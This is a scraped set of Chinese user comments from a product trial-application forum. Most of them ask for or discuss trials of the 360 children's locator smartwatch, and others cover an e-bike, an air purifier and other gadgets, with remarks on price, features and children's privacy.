很喜欢这个产品，希望可以通过哦
希望能有跟孩子打招呼的功能，这样可以远程提醒小孩时间到了该做某件事了。
宝宝需要一个健康的环境，快点来吧
看着挺不错
希望选上我~希望选上我~
不错，支持！
希望可以中
很需要这个儿童卫士，拿不到试用产品不要紧，请尽快上市
期待个性化实用产品发布
希望能为宝宝申请到
期待回归自行车时代
第一次申请期待啊
期待给宝宝贴心呵护
刚在QQ上给10个孩子的同学家长推荐360手表，希望这次能申请成功！
儿童节的好礼物，可惜今年是拿不到了。建议使用电信卡，毕竟大部分家长认为电信卡更低的辐射。既然可以实时录音，那应该也可以定向拨号和通话，至少可以收到提示回复设定的短信
希望能够给孩子申请到，我家是男孩子，调皮是他的天性，为了我们做父母的放心，能够看到每天孩子的去向，非常期望这款手表。
我们这里已经有骑的了，感觉不错，很拉风，路人都在看。
家长放心，小朋友开心
快点上市吧
需要健康生活
真正为有小孩的家长考虑了！！！
申请了，期盼中。。。。。。
好多都进老爸申请的，我也是老爸
支持绿色出行 
确实不错，很值得拥有的。。就是价格好贵哦
写的很有重点，赞一个 大家就是更想看怎么用的。。以及。。萌妹子
孩子和家长都很期待哦，快点拿到试用一下
很好的产品，为了广大的父母考虑。造型卡通，还是比较适合孩子心理的
这个老年人也能用
若能中奖，证明试运已到
很实用，给孩子用手机怕辐射，但是没手机又担心孩子在哪里。现在有了这样的产品真的很放心，很想试用下
需要给自己的小孩准备一个。
价钱要再低点就好了，可以用小米的互联网思路，采取工厂直销的方式，产能跟上的话，就预约购买。
多自私的车子啊，没后座的！
支持环保产品，期待中......
请问怎么预约
感觉好科幻啊，会不会用这个锻炼出小说中的精神力或念力啊。
酷，城市人群缺少运动，又没时间运动，这个好一举两得！
感觉没有太多的新理念
建议开通实时通话功能，这样的互动比手机强多了。
感觉好好玩，想要一个
分辨率太小了
快点上市吧！！！
看着不错，就是不知道实际效果，有没有宣传的这么好
期待中、、、、、
感觉超级帅的样子！！主要是轻薄，很适合随身携带~希望早日推出可以送爸妈~~
看起来带出去会不会有一点很腻害的样子！！~用起来更帅啊~~
好想给孩子买一个，快点上市吧
外形超级棒~，设计理念很人性化。希望价格不会太贵~
看了电影【素媛】真的感触很深，希望360儿童卫士可以戴在每个孩子的手上。
好贵啊，只能看看啦 
看起来很牛X的样子，什么时候能出，就是不知道价格咋样
助力自行车早已有了，设计思路也不算新颖吧。
快点上市吧。很需要这样的安全产品为了孩子。
最好加入对讲机功能~
现在类似的产品还是挺多的。外形很酷。
第二次申请了，希望有机会能试用这个产品
爱孩子的父母，希望自己的孩子能够平平安安的，希望能更多的了解，知道孩子，我希望儿童卫士能够做到，圆广大父母的一个爱孩子的梦~
好多的建议哦。报告排版也很不错哦。
哈哈家里刚装修好希望可以搞一台试试
应该设计一下，不可以轻易解开，需要密码之类的
咨询一个问题，红外或者射频的话需要视距控制，RM2放在客厅里的话，怎么控制卧室的电视机或者浴室的热水器呢？
申请n次了，还木有我
申请了，小盆友很调皮啊，非常需要
要是有丢失定位或自锁功能就好了，这么贵的车子可不想便宜了小偷们
希望可以搞一台，放动感单车前面吹，估计感觉能不错。
看起来不错呢
这个好，再也不用担心丢钱包或手机了
什么时候上市啊
好用的很，不再丢三落四了~
小型高端产品值得推广
我的孩子也需要一个360儿童卫士2手环。 
 电池没有加锁，方便小偷偷盗啊，呵呵，产品也没有说明电池的续航能力及充电时间
最近父母要带孩子出远门，真的有点担心，有了它是不是会解决很多担心和麻烦那
太有才了，希望价格是大众化的
我也给我家小妞申请一个
太好了，360真给力，这么贴心的设备！
很给力，很需要，很期待。
此款产品，不但可以给孩子用，也可以给 爷爷，奶奶用。  真是解决了 很多担心的 问题
不错哦，360很贴心。
一直都使用360，，觉得360是真心为用户着想，不像腾讯总是变着法子收费。
期待这款产品的效果，很需要这样的好东东。
担心宝宝的安全，希望这款产品与期望的一样，会介绍周围的家长使用。祝天下所有的宝宝平安健康快乐地成长。
希望有宣传的好
赶紧正式发售吧，话说这周期有些长啊
什么时候发售啊
上次参加武汉同城会，看到这个产品，现场抽奖没有中，期待啊
不开心,看完妹子不给置顶
二代才是真爱。
真心期待快点发售！！
高端大气上档次，狂拽酷炫叼炸天
东西和创意不错，但是价钱太坑爹。
赶紧量产吧～祖国需要你～人民需要你～我更需要你
单车重量是多少，太笨重了出行也不方便，还有电池的充电也是一个问题，能和手机保持关联吗
期待二代能在六一前发售 送儿子的节日礼物
不管能否有试用资格，还是希望能够早日上市啊。。
我家也正好装修，估计甲醛什么的也不少，刚好弄一台净化一下
儿童安全，360度的守护
等待有大半年了，早日上市吧。。
哇  厉害 会不会练出特异功能啊 
还在创意阶段，希望动作能够快一点。
拒绝日本货吧，好吗360 别让我们这些粉丝 失望。
快点上市吧，一代派发了500个然后就没信了，二代还是这样么？
在不批量生产，别的厂家 就会跟风生产咯 360 只要不生产日本货，我支持你。
8900 是不是 太贵了呢？
期待，早日上市。通过使用360手机、电脑卫士，还有360随身wifi，对该公司的社会责任、产品质量、创新精神还是蛮认可的。360雄起。
俺也希望能中改善一下家里空气质量!
waiting......
再不上市 就坑爹了 我已经花500买了一代了 真正需要的父母伤不起啊
三角的形状不错哦，有个性！
支持360，希望能像卫士保卫电脑一样保卫儿童
坐等试用结果哦！
赶快公开发售吧，强烈需要的
儿童又多了一道安全防线
对这款电动车很向往，本人爱好运动，但是骑一般的电动车得不到锻炼，如果能体验这款电动车，就太棒了！相当期待。。。
感觉好酷，如果能试戴就太棒了。。。
预约已经过去了吧。
支持，赞，很是期待。儿童贴心安全卫士。
这款手表，不但外型设计漂亮，功能更是我们做父母所期待的，希望能申请成功，让宝贝体验一下，相当期待！
的确很智能，希望能早点试用哦。。。
我的都到手了，超值
保障儿童安全的又一道防线，很想要。
裤子花边太性感了，亲。
好方便哦，感觉相当智能。我，值得拥有吗？呵呵!期待中。。。
哇哦，好科幻的感觉，好想体验哦，期待中。。。
外形漂亮简洁，功能人性化，很适合我家宝贝！期待中。。。
超喜欢，以后可以更高效率的攻克注会考试了。。。期待哦！
孩子很需要，比看科普书要好很多，期待中。。。
感觉很好玩，孩子会很期待。。。
哇，好酷哦！我是一个体育爱好者，对这款车好期待。。。好想马上体验呢，呵呵！是人力是吗？那是不是能起到锻炼身体的效果？
好酷哦，简洁时尚！好期待哦。。。
好时尚！孩子一定喜欢，很期待！
貌似要好贵
哇，功能好多哦，给我们女性带来了福音，好期待。。。
盗图，盗测试结果。。。你造咩。。。。
好期待。。。
呵呵，感觉好神奇哦，只能穿给老公，期待哦！
会不会好贵
好期待哦。。。
好酷！值得拥有！
拍科幻片吧，难以置信
搞个后座可以载人的版本不错，二口子可以优哉游哉
小型高端上档次，即净化了空气，又能上网。集多功能于一体。
 很期待 赶快发售吧
入门级感应装置不错！
第一张图和原理那三张图是网上找的，其他的图都是我自己的
已改，精确度测试的是我自己实测后做的
支持360，希望能像卫士保卫电脑一样保卫儿童 
一千多块还是很超值的啊。
希望在上市以后可以在市面买到，每一位家长都希望自己的孩子能健康成长，有360儿童卫士手环让家长放心，孩子带得舒心！
哈哈哈 我是360的忠实用户 这个儿童定位 国外早有公司开发研究 不错 
赞一个，支持360 
太帅了。。。
猛顶狂赞           永远支持360
在不卖 孩子就要长大了
平时工作忙，总是忘记喝水，这样就方便多了，希望早些出，价格合理
我喜欢！赞！
很便利，希望早日推出，孝敬父母
在徐友彬的《2050年》中有提到过，没有想到真的可以实现，希望早日推出，有好的销售额
哈哈哈 我是360的忠实用户 这个儿童定位 国外早有公司开发研究 不错  
新产品，没见过，想让孩子体验一下，日后想经营此产品。肯定行
很方便，智能，在外观上有所改进就完美了
360是不错的软件
看起来不错的样子！不过我得先有个女朋友- -！然后结婚，然后要小孩 哈哈，我挺关心价格的，不知道能不能透露一下价格？
有些期待它的产生
如果有的话那是非常棒的
涮杯子的水会记录进去么？那就混淆了 
希望表带质量要好，还要通气，否则会热，可能刺激皮肤！
其实老人也需要的！
这对10几岁大的小孩一点都不好，一点隐私都没有
快点推出市场啊，国产里面似乎没有这样的产品，我觉得这块的需求还是很大啊
我和我太太都一直在用360的相关产品的服务。这款儿童手表，我觉得对照顾小孩挺不错的，就不知道有机会得到吗？价格是否可以透露一下下啊？
要是能设计成儿童不能自己随便取下来的会不会更好？
其实我是个小屁孩，我觉得这个产品不错！而且有了这个爸爸妈妈再也不会但心找不到我了！
道高一尺。魔高一丈。儿童走失在中国最好不要被拐。不法分子也在升级，他们也能第一时间丢掉手表。其实还是大人们多负责，多花心思在孩子身上，一般不会走丢的。当然这款软件还是给赞，支持360
看着不错，如果价格出来合适了准备给孩子买一个。
连隐私都没了，有什么好的，大人只知道盲目的关心却没有考虑过孩子们的感受。
高一尺。魔高一丈。儿童走失在中国最好不要被拐。不法分子也在升级，他们也能第一时间丢掉手表。其实还是大人们多负责，多花心思在孩子身上，一般不会走丢的。当然这款软件还是给赞，支持360 
实我是个小屁孩，我觉得这个产品不错！而且有了这个爸爸妈妈再也不会但心找不到我了！  
爱奇酷  给奇酷点赞
期望给我家帅宝贝争取到这个好宝贝贴心温暖100%
同意，小孩子之间的通话都听到了，如果换成是大人，你会接受吗？小孩的个人隐私都没了，如果手机被偷了呢？
希望得到一个给我家的孩子带上  不知道定位准不准 和市场上的有什么区别
期待中！等有试过的朋友请多谈点！
360，我的最爱！永远永远支持力顶360！！！！价格几何！贵了买不起呀，哈哈。
我也申请了，是免费的吗，非常需要啊！
插座孔不同
配置有点低，不知道用着怎么样？
太贵了5555555555555
不知道怎么买呢
得到的不只是物品而是一种心情，大力支持奇酷网！！！！
永远支持360！！！！！！！！！！！！！！！希望能得到手表
360，我的最爱！永远永远支持力顶360！！！！价格几何！贵了买不起呀！
永远支持360！！！！！！！！！！！！！！！希望能得到手表 
产品价格和具体的上市国家目前都还没有公布，慢慢等待吧。嘿嘿！
要是丢了还能找回来就好了，我的戒指就被我丢了%&gt;_&lt;%
等待你的到来
希望快点拿到试用一下
一个字吊。   最好能便宜
360一如既往的支持你
我非常的喜欢。
希望得到试用的机会，谢谢啦！
为什么不支持WP8系统呢？我相信WP8明天会更好。我用的就是WP8系统的。可我也想用这款儿童手表。很纠结啊！！！！
好像空气净化器降价了吧 从2880多降到1680了
希望可以搞一台，放动感单车前面吹，估计感觉能不错小型高端上档次，即净化了空气，又能上网。集多功能于一体。  
孩子即将升小学，作为妈妈，很担心孩子在路上的安全，特希望能够得到试用机会。
看起来不错，但愿有幸获得试用资格！
360儿童卫士2,表防水吗？马上进入暑期了，孩子流汗多，万一进了水（汗）怎么办？？？？
啥时候我能等到啊 
 价格最好在100以内，不然还真买不起。谢谢了
希望能得到手表  
我怕孩子和社会上的坏人在一起，特别希望得到试用机会。
是美元。。。1美元相当于7,8RMB。。一个智能戒指可能只有149人民币吗，呵呵。不懂就别乱说，逗比
不知可以跑千米？如果一次充电可以跑300千米就ok了！速度是多少呢？如果能达到每小时25千米正好。
不知可以跑多少千米？如果一次充电可以跑300千米就ok了！速度是多少呢？如果能达到每小时25千米正好。 
8900太贵了，降低3000就ok&#039;了
后座下面可以再加一个小的电池，作为备用电池在紧急情况下使用。这将大大吸引消费者的眼球。
要是能得到手表，一定好好写个测评，这是我的强项，呵呵
座椅必须舒适，以解决长时间骑行的臀部的伤害。
我也好希望可以得到这款产品，毕竟做爸爸妈妈的总是担心孩子的安全问题
看起来好酷
希望能获得试用机会
呵呵 孩子的安全很重要，低辐射、颜色鲜艳、造型可爱抢眼。希望我家宝宝有这个机会试用呵呵
比较贵，老百姓的鲜血又会被这些阴谋不轨的商家无痕的喝掉了。哈哈哈。
我希望可以得到这款产品，毕竟做爸爸妈妈的总是担心孩子的安全。重在参与      能得到是最好的       
我也是这么觉得的！最好是给小一点的儿童用最好，大一点的就不用了吧！否则我的隐私哪里去了。。。
新的创意有新的功能，这款手表科技信息技术含量较多，符合当代信息手表的要求，但是具体的功能，只有公司内部的人知道，希望透露更多，使我们能够完善了解它。很不错。
试试，对孩子很好追踪，家长可以安心了！
这样的成品很好！我好想拥有一个嘿嘿价格不要太贵哟期待中！！！！！！！
没有你们想的那么厉害（例如多做一些操控电子仪器开关和活动的锻炼）读明白这话的意思。反正还是用到头脑，还是用到手。。。明显的就一无用发明
希望能有试用的机会
支持下，不过感觉这些东西跟一个外带软件一样啊
很新奇的东西，做工也不错。希望有更多的试用机会来体验360的更多新奇酷的产品！
要是能得到手表，一定好好写个测评，这是我的强项，呵呵 
感觉很酷的样子！
本人学生，一直都想要一款电动车，赶脚高大上，持续关注……
赞同座位座垫下提供备用电源。另外建议车把手也希望可以弯折，节约空间。便于放在汽车后备箱！价格如果再便宜点，考虑购入！
很新奇的东西，做工也不错。希望有更多的试用机会来体验360的更多新奇酷的产品！ 
看着不错，不知道更换滤网什么的是否方便
一定好好写个测评，这是我的强项
我想买一个。
好酷......
好想要要，孩子贪玩，胆子越来越大
酷，够高科技
只想早日能买到这款产品
MS有通话和数据传输功能，想了解下使用成本和配套硬件要求。
什么时候有卖的，买给我妹妹用
真的不错，我小的时候就走丢过一次，我爸妈说当时走散后，是街上一个摆摊卖烟草的大爷发现我，然后给我买了吃的让我不要乱跑，后来我父母找到我后给大爷买了礼品送给大爷，现在想想当时如果真的走丢了，现在我们幸福的一家会是什么结果，所以这个产品我绝对1000%支持！
孩子安全的保险
加上视频就好了 我想了解孩子在幼儿园有没有被欺负  有没有吃好
能意念打字就好了。解放鼠标手。也是中老年人的福音，还动摇了手写板的地位。
是否设置了童锁的功能呢？
宝宝奶奶带  希望能得到试用机会  谢谢
怎么预约，看了半天没见，有京东买的链接吗
再加一个小的电池.脚踏好像矮了
太有创意了，还可以折叠，携带方便，价格可能偏贵了点！
还以为是多科技的东西呢，不就是热熔枪吗，五金店有的是
期待……只是版本低用不了，很遗憾！
小巧易用，方便快捷，有了它，家长可以放心啦
首先感谢奇酷给我适用机会，到货速度很快，东西更赞，期待多多的新品适用，另外就是适用名额加大吧，呵呵
如果只是给“手”一个信号，而“手”并不产生反应。那么就可以达到不动手却能让头环感应信号了，这段文字所指的锻炼，就是对控制力的锻炼了。就像自协调式假肢一样，仅仅是神经元发出的一个正常信号就能使假肢进行相应的动作。
很想拥有一个
现在可以购买吗，找不到预约啊 
我喜欢，就是不知道价格？ 
好东西，好想试一下。
为了孩子的安全，一定要买一个
孩子的安全……做大人的一定要重视……有这样产品…直得一试……
这个东西真心的支持
这个很好，特别适合夫妻同一单位上班又只有一台车的，可以折叠，放后备箱，等值完班用  一流
有效负荷是多少呢，确实能够用脚踏来控制速度的骑行方式更符合操作习惯吧。。。
这个好，何时上市？
和多啦a梦里的一样，早就想有这样的东西了。
好产品，已申请，望通过，快销售！
已申请，好宝贝，值得拥有！
这个东西真心的支持 
用科学产品，不落伍
希望要一台
3D打印机是个好东东，价格有点贵
出行携带方便，是否能检测超标数据，有中文字幕的吗
我的是安卓4.1系统支持不。三星s7898。
真心支持哦
很期待，不错的东西
这个东西真心的支持
已申请 一定要给我一个   敲了好几个字了，删了好几次了，就是不知道怎么表达好
第一次5000个没申请到  不过产品越成熟对小孩比较好点  毕竟是小孩 不是小白鼠 
支持期待试用
一代还不知道去什么地方购买呢，老大，什么时候上市。
小巧易用，方便快捷，有了它，家长可以放心啦！真心想拥有一个。
天天看试用，啥时候才能真的用上？ 都等烦了···
很期待使用！
说实话，真的是一件很实用的东西，顶一个，我也申请了谢谢
这样一款产品能带给家长好些安心，如果真的意外走失，可以追踪路线顺利的找到孩子，这比什么都强啊，预防一下总是好的。
东西很好  很实用 让大人更放心 如果能通话就更好了  已经申请
太高科技了，不敢想
这定位系统，很好。为我们家长解决后顾之忧。材料安全，低辐射，孩子的健康有了保障。好宝贝，已申请。希望我的孩子能拥有一个。
像这样的产品就应该多研究出来一些，很实用。特别是一些经常不和孩子住一起的家长们，有了儿童卫士就放心多了。支持！！！
我是贫困山区的孩子，我需要一个。
到底能不能上市的，搞了这么久？
顶，如果真的好，就算很贵，家长也舍得买；如果真的不好，就算免费，家长也不会要~
设计者匠心独具，非常适合独生子女儿童使用，是为人父母的福音
申请一个给小孩。
会为会有辐射呢！！！！！！！！
是呀，我也不知道啊 
大家好！请问是真的免费吗？
睡觉时不敢带啊，要是做了暴力点的梦怎么办啊，早上醒来-------不敢想象。
一切都是为了孩子，他们安全健康就是我们最大的收获。已经申请，好东西要顶一下！~~~~~
别扯了，贫困山区没有网络覆盖，有了也没用啊。还是把机会让给有网络覆盖地区的孩子吧！
已经申请了，可以购买吗？ 如果申请不到的话
每天早上我们上班早孩子上班晚，总是不能把孩子送到学校门口，现在才1年级，就要让孩子自己走一段的路，很操心。如果有这个就放心多了。
老爸是一名普通的人民教师，但是他很敬业，一致导致嗓子得了咽喉炎，最近空气质量不好，导致老爸的咽喉炎症状加剧，一度失声，希望给我一台空气净化器，能改变室内的空气质量，能在家里保护老爸的嗓子。
说的很好 不知道用的时候怎样了  
由于长期坐办公室，现在身体一直感觉很疲倦，如果有这款产品可以时刻提醒身体状况，并提供如何改善建议将非常便利，期待早日量产，并提高试戴！
有利于环保，支持，价格较高
找了很久，终于看到实物了。期待。
难道不是独生子女的，就不可以拥有吗？凭什么独生子女就非常合适呢？
非常酷的,简洁而不简单的闹钟!非常适合我家的小孩
支持，刚刚申请免费试用，不知能否中签，期待中
我觉得360儿童卫士2代比一代漂亮多了，孩子比较喜欢二代的。非常期待能申请成功。
这个小模特有点小莫愁的范哟
感觉没有1好看啊
应该设计一个选配的健身发电系统，健身时可以发电为电瓶充电。
一切为了孩子，好
喜欢，期待，就是价格不要太贵，考虑大众的需求与购买力
我一早就想买个这个东西了
小孩子现在一上街就找不到人，到处乱跑。有了这个能随时获取他的位置信息，还能查看他的周围的环境声音，很理想的设计。期待能申请成功一个~~~~~~
那肯定，对于更加小的小孩，特别是上幼儿园的，学校居然有给小孩吃药的习惯，如果有了这些，我们就可以更好的监督，，，另外10来岁的小孩也不是不可以用的啊，起码我可以知道小孩的准确位置，你作为大人需要保护小孩的隐私，可以手机上锁以防被盗，同样也可以不开启窃听功能的。。。就让一台手机可以监听的到，你选择性使用该功能就完全可以保护小孩的隐私。
小孩经常喜欢乱跑，期望这产品好用，也希望能申请的的，好用的话，到可以推广
已经申请了，等结果…… 
使用很方便，插入可上网的电脑的USB口，就可以将有线网络信号变为无线网络信号。 系统自动安装，提示360WIFI名称和密码，名称和密码都可以修改，密码可以隐藏。 东西小巧，可随身携带，特别方便在办公室或出差使用。同时还赠送10T的网络云盘。360考虑的是太周到了。 
我觉得第三个功能可以考虑儿童同意情况下，如果偷偷做完全是对儿童的隐私人权自由的一种侵犯。即便是父母这样也是不对的。
好东西，真的很需要，非常需要，我申请了，我家是女孩，现在特别担心她的安全，电视报道的那么多小孩不是被 老师打了，就是被坏了给伤了，我特别需要一个这样的东西，来保护孩子……。担心中……。期待中…………。
不错，很想体验一下
现在社会不全因素太多，每家都是一个娃，有这么一个会放心不少，期待申请成功
好东西，好想试一下。
感觉很有未来科技的味道 
我已经申请了,希望能通过,不知道它防水么,要是防水那就更好了,是一个值得推荐的好东西
一个字｜酷
想不想赛亚人的战力分析检测仪
孩子现在都贝，这个东西真心很不错！
很好很强大 
是360的忠实粉丝，期待360为宝宝带来好运气~期待~~~~~~~
嘿嘿 我也想要  出去 肯定帅呆了 
造型不错，非常喜欢，比淘宝上的好看不止一点点啊！还可以远程遥控，又好玩，又节能，又实用！希望能抽中一台，哈！哈！哈！
比较科幻 就是喜欢比较高级的东西
为了孩子的安全，效果好的话，会推荐朋友来购买，希望能够申请成功！
为了孩子的安全，为了天下父母心，就圆了我这个梦吧！期待申请成功！谢谢！
这个看起来还不错哦
支持！支持！期待申请成功
是啊 这款适合学生上学的时候使用 但是不知道价位在多少 真心想买下 
申请了好几期的试用，希望这次成功。
就想有这样的东西了，不用担心丢钱包或手机了，哈哈
看上去比较科幻
申请时看错了，以为是手表手机- -#
支持！强烈支持！为了孩子的安全！ 请批准我的申请！！！谢谢
努力赚钱奋斗挣钱拿下 
为了孩子的安全 父母可以做一切事情 这就是父母
能不能考虑生产其他的系列产品，适合相对隐秘的佩戴方式。毕竟手表太显眼，如果遇到坏人绑架，把手表摘下扔掉的情况。
希望它做到防水、防摔、防划！！最主要的一点我觉得需要改进！那就是外形太明显，歹徒只要见过这种类型的东西如果作案一定会第一时间把表弄下来，所以希望品牌LOGO坐在表的背面就好，正面还是很普通的电子表最好~~~~
抱着平常的心，去做平常的事。对于这款手表，有点小激动了。
期待....
震撼啊 怎么没有看见价格呢 
价格真心说有点贵，现在载重的电瓶自行车才2000多元，这么一个小东西就要9000元，估计我要是有需求也买不起这个车。
很人性化的产品，我已经申请了，期待中。。。
给平淡生活添加色彩！期待激动时刻！
有了这款手表是不是就感觉孩子一直都在身边，期待
新式新颖，很喜欢，就是不知道多少钱
能否试用哦 
现代化的生活需要高科技的产品，办公室的至爱，好想拥有！
好东东，马大哈的至爱
不能打大件
电池容量怎么没有解释，一次充电在平路上可以骑行多少公里？
支持！支持！期待申请成功！！！
给我一个呗
感到手表太好了，支持一个
严重同意！！
如果好用，投放市场反响应该也会不错的，希望做对的事儿，严把质量关！赞！
太棒了！希望能便携，我经常在外面跑，非常想要一个容量大又不占位置又漂亮的杯子！
期待申请成功，为了孩子的安全着想，谢谢！
嗯，大贵了哈，我自制一个去。
360儿童卫士，孩子们的保护伞！申请是必须的，期待试用！
东西太棒了，创意感很强，低碳环保，超赞。
支持天朝克隆一个。
真希望多些这样能保护到我们宝宝的产品，很是期待呀，相信做家长的都有同样的心情，真的能申请上吗？
为了孩子，我已经申请了，期待中......
很棒的产品，可以用来孝敬父母。
同意这个观点！！
超级棒环保又实用
请问当手表取下的时候有没有给手机发送记录并在强制取下时给手机警报的功能？另外一个科幻一点，有没有跟人体绑定的功能？
严重同意，建议改进产品。
这样的杯子很酷，还能记录喝水的量，要是能防漏，可以方便携带，那就更好了。
精准定位，手机可以访问，走在时尚与科技前沿，追求高质量生活人士首选！我的申请我做主！
为我家小孩申请了，期待申请成功！
快到儿童节了，想给侄子侄女一人一个~~
怎么才能买到呢 
非常支持,期待我可以获得试用资格.
为了孩子，我也申请。希望官方人员批准申请，谢谢。
刚刚申请了，太期待了，如果有了这个神器就不用整天提心吊胆了！
期待被选中，能给孩子一个保护伞。
确实很值得期待，刚刚申请，不知道能不能申请到
太好了，正需要呢！感谢360推出这么一款功能强大的神器！
期待申请成功，为了孩子的安全着想，谢谢！
建议在改进一下界面，英文版的不太好，建议改成中文版的。
跪求试用申请通过啊
期待申请成功！！！
能自己随意建3D打印模型吗？可以的话就能自己创造想打印的东西了，不然没多大的用处
马上就是孩子的生日了~希望能得到这个手表作为最重要的生日礼物~ 写的打油藏头诗希望会有加分~ 陈家***种青竹； 俏娇可心一方著； 依人在水划清波； 生龙活虎捉金蜍。 日生朝霞烟笼湖， 快马相扶奔康途， 乐伴家妞心知足。
陈家有女种青竹； 俏娇可心一方著； 依人在水划清波； 生龙活虎捉金蜍。 日生朝霞烟笼湖， 快马相扶奔康途， 乐伴家妞心知足。
原来还有这么个神器太好了
奇酷，关注很久了，产品都很新颖，很美的创作，希望尅得到这次的试用机会，感谢在奇酷一线的工作者。
快到儿童节和宝贝的生日了，爱她就赶紧给她申请试用下吧！
期待选中呀，这都第几次申请了，之前都没有通过
看完介绍很期待，有更详尽的介绍资料吗？
不错(⊙o⊙)哦
别忘记了寄来了还收运输费
刚搬新家  需要  看起来好高端的样子  希望搞一台呀
为了孩子的安全，支持360的产品
建议如下： 1、儿童一端应该能发送危险信号，同事录音，并手机端报警，不知有否。 2、360的logo不一定放正面，产品可多款式，防止坏人认知360产品，也可照顾到不同年龄阶段、不同性别的儿童。 3、顺便赞一下360产品的工业造型设计，大都简洁喜人。（但此儿童卫士或有可升华空间）
我们这边    丢孩子的特别多    现在有了这款定位手表   以后孩子跑出去也不发愁了。
我也申请了，不过申请的人老多了。为了孩子人多也要申请，让我亲朋好友行动起来
清新的外观和不错的功能，希望能申请到一台。
怎么甩干啊？疯狂加速吗？加一个变速功能吧，能省力点
确实很期待，设计理念很贴心，同意刚刚有个朋友说的，360的标志可以不再正面，以免被坏人识别
关爱下一代。
很吸引人，手表防水吗，定位原理是什么呢
再提几点建议： 1、不知手机端支持几台手机，希望不是一台。 2、另外建议开发Wp系统应用。 我已申请试用，希望能成功
看完介绍很期待，我一直在想要有这种东西就好了，现在终于有了，希望能快点上市，我的手机装的都是360家的东西，很喜欢，也很好用。这款英爱也不错。这个设计很可爱，孩子们一定喜欢
期待360新品新功能，期待可以成为体验者之一
录音最喜欢还有拍照！
期待。。。。。
一款好的的产品应该在使用中体现，预防，超越式关键
给力。功能很稀奇，希望进款发货。
很期待，已经申请了，希望能申请到
感觉不错，可以锻炼大脑的集中力，好东西，想试试。
这正是我目前迫切需要的，已经申请了，如果不仅能听也能看就最完美了。
锻炼出精神力和念力之前先要让大脑能承受得了这么强的电磁才行,否则一个念头发出来就先把自己大脑烧熟了
哎喂,管理员呢?怎么能不给我加精?这不科学吧?写得这么漂亮 - -!!!!
这款是我最关注的，期待能申请到!
长得好看，很简洁
不是很详细，体积小 鞋带方便 适合出差使用 很想要一个呢~！
好看，很喜欢
价格好贵啊，还想给孩子自行车配置一个，自行车才1100，这个灯都可以再买一台了。。。。
我有电脑时就用360卫士，很好！支持产品开发！
受房型限制，家里最近总感觉有点异味，真心希望能通过这次的申请，让家人拥有健康的身体！
360的WF我已经买了，可是也只能是蹭人家的网，要是没有网络蹭 这东西也只能是摆设。要是有类似移动WF的就好了~~体积小占优势~
设计不错！！ 值得拥有！！！
期待360新品新功能，期待可以成为体验者之一 
不是说北斗导航更精准么？建议研究，提高定位精度
不错不错，还应该加一些接口 比如发的电能给手机充电等
100刀是多少人民币？有提示是语音？数据及时传递到手机？信息显示方式？（有人习惯有信息就看信息而不管是否在开车，如果是信息直接提示，是否增加安全隐患？） 价格如果合适，我还是想买个，虽然我车上有行车记录仪但是还是有个别的开车习惯不好，总感觉耗油~
看上去真的不错啊 
具体什么时间上市？等着换爱疯6呢~~我的爱疯4用了3年多了 开始出现***现象了~~
不知道IPAD上能不能用啊
有个疑问啊，这么好的东西为啥没有通话功能啊
是 软蛋大赛 或者 铁蛋大赛 呵呵
等了很久终于有款心意的定位手机，不知道有没防水，希望能申请到。
今天突然看到“第9期奇酷试用申请——360儿童卫士 2”我感觉很新奇，同时也很高兴。孩子的安全是父母最为担心的事情，现在社会环境复杂，车水马龙，外在环境让人担忧。平时父母工作忙，或者出门旅游等，孩子不可能永远装在父母的视野里，在保证孩子安全的前提下又能高品质的生活是一件惬意的事情。我在想有了这个儿童卫士表，我的担心就是多余的了。
越看越觉得这小模特有吴莫愁的影子
正想着能给带上这样一种东西该多好呀，没想还真有，好想要，试试看吧，我一般是没有这么好的运气
正想着能给孩子带上这样一种东西该多好呀，没想还真有，好想要，试试看吧，我一般是没有这么好的运气 
我也是希望中..................
办公室用不错
蛮感兴趣的
看到“奇酷试用申请——360儿童卫士 2”我感觉很新奇，同时也很高兴。孩子的安全是父母最为关心的事，
这类产品价格还是贵了，便宜的话会很快普及
期待什么时候可以购买呀！价位如何？
很不错的产品，期待拥有!
类似于隔空移动物品？
如果  试用效果  好  会帮忙宣传
曾经也有这样的想法，将手机的一些基本功能移植在手表中，又方便又便捷，GPS定位功能的移植只是刚刚开始，将来的功能更加齐全。其实这个东西的核心在于用电，电池要小又要能过存储大量的电，其次就是电子设备总能耗需要降低。
中国的流量计量伤不起啊
很不错，正是我想要的
很不错的产品，正是我想要的那种，期待中................
什么时候能批量生产啊 
不单适合儿童，还适合具有一定活动能力又有老年痴呆倾向的人。
孩子的安全、父母等老年人的安全，是我们的头等大事，希望贵公司多出一些这样的产品，越来越好！
希望试用效果良好，这样老人和孩子都可以用！
去看下《红辣椒》（又译《盗梦侦探》）
造型还能更丑点吗？
很棒的一款产品 希望早日可见
期待  我的电脑用360非常好支持360
敢不敢拍摄个样片让我们看看？如果要买 那都是干摄影这行的，不看样片怎么决定
不是5。15查询试用结果吗。
期待 期待  老人与小孩儿都适用
多谢支持 谢谢~~
是的哦 还很好用··
太赞了，期待。
不成熟的产品，做show来融资，其实也就是中国人才会这么冒失的去买，媒体还帮做广告，哎现在哦~~~~~~~~什么世道，好好的实业不做来投资这些消费品，国强则民富，有钱的有多少啊
家里快装修完了，正愁怎么除甲醛呢，这个机会难得啊，希望我能幸运中签。。。
苏州超微精纳光电有限公司，领先全球光学制造制造，精密光学加工，红外单点加工，自由面加工，二元面加工，复眼加工，精密轮廓测量，精密粗糙度测量，等有色金属，红外镜片， www.globoptical8.icoc.cc/微铣削加工,光学透镜的制造,微光学结构元件,离轴抛物面、双曲面、椭球面,非球面、离轴非球面,精密塑胶自由曲面透镜、精密塑胶异形光学元件、精密塑胶复眼透镜、精密非球面红外、光学设计 
申请的人太多，不好筛选？
这个多功能手表真的很实用啊，不但可以定位孩子，还可以定位老公（老婆），哈哈。。。
定位促进和谐
太好了！希望早一天到手啊!
太少了，时间太早 读书的根本买不到   希望以后在周末
名字都说填不上，怎么申请试用？
看着不错，是不是前轮驱动的？
永远支持360，好人有好报
下一轮抢购的时间是好久
等了很久终于有款心意的定位手机，不知道有没防水，希望能申请到。 
哪年能普及?
不错。很期待哦。
这个还是很实用的,希望能便宜点
早就有了吧
很期待360这款产品，希望能有机会得到。
感觉很不错的说呢，好像买来戴戴呢
好像很方便的样子
期待能够申请成功
期待中，应该很适合孩子和老人。
希望弄上去到一台！
定位手机有一个，但小孩携带不便，还有辐射健康问题，所以没360儿童卫士手表方便安全
希望老人与小孩儿都适用 
已经申请成功，期待使用产品。
很适合家里的淘气小爷，希望有幸申请成功，为小爷保驾护航，也让我们少担心。
期待中，应该很适合孩子和老人。 
